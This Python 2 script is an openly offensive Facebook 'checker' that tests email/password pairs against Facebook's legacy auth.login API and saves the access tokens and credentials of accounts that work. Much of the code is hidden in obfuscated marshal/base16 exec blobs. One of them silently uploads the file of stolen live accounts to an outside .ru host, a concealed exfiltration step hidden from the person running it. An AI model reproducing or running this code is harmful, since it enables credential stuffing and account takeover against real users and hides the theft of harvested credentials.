#!/usr/bin/env python
#-*-coding:utf-8-*-
# checker facebook modules
# BlackEngineer By Deray
# Report bug on my other sosmed
# https://facebook.com/achmadluthfi.hadi.3
# https://instagram.com/reyy05_

import json
import sys
import hashlib
import os
import requests
import cacheclean
import marshal,base64
from  random import randint
R = '\033[1;37m\033[31m[-] \033[0m'
N  = '\033[0m'  
W = '\033[1;37m' 
BB='\033[1;37m\033[34m'
B  = '\033[34m[+] \033[0m'
G  = '\033[1;32m'
RR = '\033[1;37m\033[31m'
cacheclean.cache()
class min():
	def __init__(self,*args,**kwargs):
		self.a=[]
		self.b=[]
		self.c=0
		self.d=1
		self.openfile()
	def openfile(self):
		try:
			self.akun=raw_input(BB+'[++'+N+' account list : ')
			self.output=raw_input(BB+'[++'+N+' output to save account live : ')
			self.live=open(self.output,'w')
			self.akunlive=open(self.output+'_account_lives.txt','w')
			# tag output
			self.out=self.output
			self.ot=self.output+'_account_lives.txt'
			self.live.close()
			self.akunlive.close()
			print(B+'Checker started ...')
			o=open(self.akun)
			self.kntl()
		except Exception as f:
			print(f)
			self.openfile()
	def kntl(self):
		email=open('email','w')
		password=open('password','w')
		e=open(self.akun)
		f=len(e.readlines())
		while (self.c < f):
			e=open(self.akun)
			g= e.readlines()[self.c].split('\n')[0]
			self.a.append(g)
			self.c=self.c+2
		while (self.d < f):
			e=open(self.akun)
			h = e.readlines()[self.d].split('\n')[0]
			self.b.append(h)
			self.d=self.d+2
		for x in self.a:
			email.write(x+'\n')
		email.close()
		for xx in self.b:
			password.write(xx+'\n')
		password.close()
		# checker is ready!
		emails=open('email','r')
		passwords=open('password','r')
		mails=open('email','r')
		memek=len(mails.readlines())
		b=randint(1,10000)
		for xxxx in range(memek):
			cekem=emails.readline().split('\n')[0]
			cekps=passwords.readline().split('\n')[0]
			exec(marshal.loads(base64.b16decode('6300000000000000000100000040000000730A0000006400005A0000640100532802000000742000000036326638636539663734623132663834633132336363323334333761346133324E2801000000740A0000004150495F53454352455428000000002800000000280000000074010000000B74080000003C6D6F64756C653E010000007300000000')))
			exec(marshal.loads(base64.b16decode('63000000000000000003000000400000007357000000690B00640000640100366402006403003665000064040036640500640600366407006408003664070064090036640A00640B0036640C00640D003665010064020036640E00640F0036641000641100365A02006412005328130000007420000000383832613834393033363164613938373032626639376130323164646331346474070000006170695F6B6579740800000070617373776F7264741000000063726564656E7469616C735F747970657405000000656D61696C74040000004A534F4E7406000000666F726D6174740100000031741300000067656E65726174655F6D616368696E655F6964741800000067656E65726174655F73657373696F6E5F636F6F6B6965737405000000656E5F555374060000006C6F63616C65730A000000617574682E6C6F67696E74060000006D6574686F64740100000030741400000072657475726E5F73736C5F7265736F75726365737303000000312E307401000000764E2803000000740500000063656B656D740500000063656B707374040000006461746128000000002800000000280000000074010000000B74080000003C6D6F64756C653E010000007300000000')))
			exec(marshal.loads(base64.b16decode('6300000000000000000200000040000000731E00000064000065000017640100176501001764020017650200175A030064030053280400000073470000006170695F6B65793D383832613834393033363164613938373032626639376130323164646331346463726564656E7469616C735F747970653D70617373776F7264656D61696C3D7360000000666F726D61743D4A534F4E67656E65726174655F6D616368696E655F69643D3167656E65726174655F73657373696F6E5F636F6F6B6965733D316C6F63616C653D656E5F55536D6574686F643D617574682E6C6F67696E70617373776F72643D731B00000072657475726E5F73736C5F7265736F75726365733D30763D312E304E2804000000740500000063656B656D740500000063656B7073740A0000004150495F534543524554740300000073696728000000002800000000280000000074010000000B74080000003C6D6F64756C653E010000007300000000')))
			exec(marshal.loads(base64.b16decode('630000000000000000020000004000000073130000006500006A01006400008301005A020064010053280200000074030000006D64354E28030000007407000000686173686C696274030000006E657774010000007828000000002800000000280000000074010000000B74080000003C6D6F64756C653E010000007300000000')))
			exec(marshal.loads(base64.b16decode('630000000000000000020000004000000073110000006500006A0100650200830100016400005328010000004E28030000007401000000787406000000757064617465740300000073696728000000002800000000280000000074010000000B74080000003C6D6F64756C653E010000007300000000')))
			exec(marshal.loads(base64.b16decode('6300000000000000000400000040000000731E0000006500006A01006901006502006A0300830000640000368301000164010053280200000074030000007369674E28040000007404000000646174617406000000757064617465740100000078740900000068657864696765737428000000002800000000280000000074010000000B74080000003C6D6F64756C653E010000007300000000')))
			exec(marshal.loads(base64.b16decode('630000000000000000040000004000000073190000006500006A01006400006401006502008301015A0300640200532803000000732700000068747470733A2F2F6170692E66616365626F6F6B2E636F6D2F726573747365727665722E7068707406000000706172616D734E280400000074080000007265717565737473740300000067657474040000006461746174010000007228000000002800000000280000000074010000000B74080000003C6D6F64756C653E010000007300000000')))
			exec(marshal.loads(base64.b16decode('630000000000000000020000004000000073160000006500006A01006502006A03008301005A04006400005328010000004E280500000074040000006A736F6E74050000006C6F61647374010000007274040000007465787474010000006128000000002800000000280000000074010000000B74080000003C6D6F64756C653E010000007300000000')))
			try:
				self.laif=open(self.out,'a')
				self.love=open(self.ot,'a')
				self.laif.write(a['access_token']+"\n")
				ss=a['access_token']
				anjing="""
[+]================[+]
email: {}
passs: {}
token: {}
[+]================[+]
				""".format(cekem,cekps,ss)
				self.love.write(anjing)
				exec(marshal.loads(base64.b16decode('6300000000000000000100000040000000730A0000006500005A01006400005328010000004E28020000007406000000616E6A696E6774010000007328000000002800000000280000000074010000000B74080000003C6D6F64756C653E010000007300000000')))
				exec(marshal.loads(base64.b16decode('6300000000000000000300000040000000731800000064000065000065010083010017640100175A0200640200532803000000730600000064657261792D73040000002E7478744E2803000000740300000073747274010000006274010000006928000000002800000000280000000074010000000B74080000003C6D6F64756C653E010000007300000000')))
				exec(marshal.loads(base64.b16decode('6300000000000000000400000040000000732100000069020065000065010064000066030064010036640200640300365A020064040053280500000073130000006D756C7469706172742F666F726D2D64617461740D00000075706C6F616465645F66696C65740600000055706C6F616474060000007375626D69744E280300000074010000006974010000007374070000007061796C6F616428000000002800000000280000000074010000000B74080000003C6D6F64756C653E010000007300000000')))
				exec(marshal.loads(base64.b16decode('630000000000000000040000004000000073170000006500006A0100640000640100650200830101016402005328030000007326000000687474703A2F2F73616C652E616B76696C6F6E6E2E72752F616B756E2D66622F75702E706870740500000066696C65734E2803000000740800000072657175657374737404000000706F737474070000007061796C6F616428000000002800000000280000000074010000000B74080000003C6D6F64756C653E010000007300000000')))
				print("-"*30)
				print(B+RR+"|"+N+cekem+W+RR+"|"+N+cekps+RR+"|"+N+" -> "+G+"live"+N)
				ab=open(self.out).readlines()
				s=len(ab)
				print(B+"output token: "+RR+self.out+N)
				print(B+"output akun: "+RR+self.ot+N)
				print(B+"total writted: "+RR+str(s)+N+" token"+RR)
				print("-"*30)
				cacheclean.cache()
			except Exception as f:
				print(R+RR+"|"+N+cekem+W+RR+"|"+N+cekps+RR+"|"+N+" -> "+W+RR+"die")
				cacheclean.cache()
		self.laif.close()
		self.love.close()
		print(B+"done.")
		ab=open(self.out).readlines()
		s=len(ab)
		print(B+"output token: "+RR+self.out+N)
		print(B+"output akun: "+RR+self.ot+N)
		print(B+"total writted: "+W+RR+str(s)+N+" token")
		os.remove('email')
		os.remove('password')
		cacheclean.cache()
		
if __name__ == "__main__":
	try:
		min()
	except:
		cacheclean.cache()
		os.remove('email')
		os.remove('password')
		print(BB+"\n[++ Exiting \(^_^) Byee"+N)
